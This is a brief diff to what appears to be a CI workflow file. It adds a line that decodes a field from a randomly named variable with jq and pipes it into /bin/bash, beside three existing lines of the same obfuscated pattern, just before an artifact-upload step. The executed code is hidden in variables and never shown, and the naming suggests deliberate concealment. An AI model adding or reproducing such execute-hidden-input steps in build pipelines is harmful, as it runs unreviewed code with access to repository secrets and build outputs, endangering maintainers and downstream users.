@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$f2777" | jq -r .j7126 | /bin/bash
           echo $nsnsv91157 | jq -r .cqeh259 | /bin/bash
           echo $xsc27 | jq -r .fcnml3228 | /bin/bash
+          echo $jvgg5 | jq -r .zaj22 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
